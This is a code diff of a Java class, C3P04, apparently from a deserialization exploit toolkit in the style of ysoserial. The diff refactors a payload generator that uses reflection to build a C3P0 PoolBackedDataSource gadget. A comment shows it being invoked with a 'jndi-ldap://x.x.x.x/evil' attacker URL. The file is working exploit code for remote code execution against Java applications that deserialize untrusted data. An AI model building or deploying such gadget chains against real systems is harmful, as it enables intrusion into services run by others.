@@ -44,7 +44,7 @@ import java.util.logging.Logger;
  * C3P04 'jndi-ldap://x.x.x.x/evil'
  */
 public class C3P04 implements ObjectPayload<Object> {
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
         int    sep     = command.lastIndexOf('-');
         if (sep < 0) {
@@ -54,19 +54,7 @@ public class C3P04 implements ObjectPayload<Object> {
         String[]             parts = command.split("-");
         PoolBackedDataSource b     = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(parts[0], parts[1]));
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(b);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return b;
     }
 
 
